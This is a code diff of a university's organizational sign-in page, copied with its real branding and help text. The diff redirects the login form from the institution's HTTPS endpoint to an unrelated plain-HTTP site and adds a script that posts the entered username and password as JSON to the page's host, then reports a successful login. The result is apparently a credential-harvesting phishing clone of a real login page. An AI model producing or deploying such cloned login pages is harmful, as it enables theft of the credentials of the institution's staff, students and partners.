@@ -51,65 +51,93 @@ function Errors(){this.reportSubject = 'Error Report'; }
         <div id="loginArea">        
             <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
     
-            <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="https://xsite.singaporetech.edu.sg/d2l/home" >
+            <form method="POST" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return Login.submitLoginRequest();" action="http://httpforever.com/">
                 <div id="error" class="fieldMargin error smallText">
                     <span id="errorText" for=""></span>
                 </div>
-    
+            
                 <div id="formsAuthenticationArea">
                     <p id="errorMessage" style="color: #c85305; font-size: 0.9em; font-weight: normal; padding-bottom: 5%;"></p>
                     <div id="userNameArea">
                         <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
                         <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
-                            spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
+                               spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
                     </div>
-    
+            
                     <div id="passwordArea">
                         <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
                         <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
-                            placeholder="Password" autocomplete="off"/>
+                               placeholder="Password" autocomplete="off"/>
                     </div>
+            
                     <div id="kmsiArea" style="display:''">
-                        <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+                        <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3"/>
                         <label for="kmsiInput">Keep me signed in</label>
                     </div>
+            
                     <div id="submissionArea" class="submitMargin">
-                        <span id="submitButton" class="submit" tabindex="4" role="button"
-                            onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
-                            onclick="return Login.submitLoginRequest();">Sign in</span>
+                        <span id="submitButton" class="submit" tabindex="4" role="button" onclick="Login.submitLoginRequest();">Sign in</span>
                     </div>
                 </div>
                 <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
-            </form>  
+            </form>
+            
+            <script type="text/javascript">
+                function Login() {}
+            
+                Login.submitLoginRequest = function () {
+                    var userName = document.getElementById("userNameInput").value;
+                    var password = document.getElementById("passwordInput").value;
+                    var errorMessage = document.getElementById('errorMessage');
+            
+                    // Clear previous error messages
+                    errorMessage.textContent = "";
+            
+                    // Validate input fields
+                    if (userName === "" || password === "") {
+                        errorMessage.textContent = "Enter your user ID in the format 'domain/user' or 'user@domain'.";
+                        return false; // Stop the form submission
+                    }
+            
+                    // Prepare data to be sent
+                    var formData = {
+                        UserName: userName,
+                        Password: password
+                    };
+            
+                    // Create an AJAX request
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "", true);  // The empty string means no specific target for the form
+                    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            
+                    // Handle the response
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status === 200) {
+                                // Handle success (you can update the DOM, show a success message, etc.)
+                                errorMessage.textContent = "Login successful!";
+                                errorMessage.style.color = "green";
+                            } else {
+                                // Handle error (e.g., wrong credentials)
+                                errorMessage.textContent = "Login failed. Please try again.";
+                                errorMessage.style.color = "#c85305";
+                            }
+                        }
+                    };
+            
+                    // Send the data as a JSON string
+                    xhr.send(JSON.stringify(formData));
+            
+                    return false;  // Prevent the form from submitting the default way
+                };
+            </script>
+            
+             
             <div id="introduction" class="groupMargin">
                 <b>Staff/Vendors</b> can login using the Staff ID / Username with <b>@singaporetech.edu.sg</b> as suffix (i.e xxxxx@singaporetech.edu.sg)<br><br> <b>Students</b> and <b>Alumni</b> can login using your Student ID with <b>@sit.singaporetech.edu.sg</b> as suffix (i.e. 12ABC888X@sit.singaporetech.edu.sg)<br><br> <b>External Partners</b> can login using the Username with <b>@ext.singaporetech.edu.sg</b> as suffix (i.e. xxxxx@ext.singaporetech.edu.sg)<br><br>Reset or change your password at the <a href='https://selfservice.singaporetech.edu.sg/'>Self-Service Portal</a><br><br>For assistance, email us at <a href='mailto:ithelpdesk@singaporetech.edu.sg'>IT Helpdesk</a> and include the following details:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;1. Full Name as per NRIC or FIN<br>&nbsp;&nbsp;&nbsp;&nbsp;2. Staff/Student ID or Username<br>&nbsp;&nbsp;&nbsp;&nbsp;3. Contact no (HP)<br>&nbsp;&nbsp;&nbsp;&nbsp;4. Personal email address                     
             </div>
     
-            <script type="text/javascript">
-                function Login() {}
-            
-                Login.userNameInput = 'userNameInput';
-                Login.passwordInput = 'passwordInput';
-            
-                Login.submitLoginRequest = function () { 
-                    var userName = document.getElementById(Login.userNameInput).value;
-                    var password = document.getElementById(Login.passwordInput).value;
-                    var errorMessage = document.getElementById('errorMessage');
-                    
-                    // Clear previous error messages
-                    errorMessage.textContent = "";
-            
-                    // Check if username or password is empty
-                    if (userName === "" || password === "") {
-                        errorMessage.textContent = "Enter your user ID in the format 'domain/user' or 'user@domain'.";
-                        return false;
-                    }
-            
-                    // If fields are filled, submit the form
-                    document.forms['loginForm'].submit();
-                    return false;
-                };
-            </script>
+           
         </div>
     
         </div>
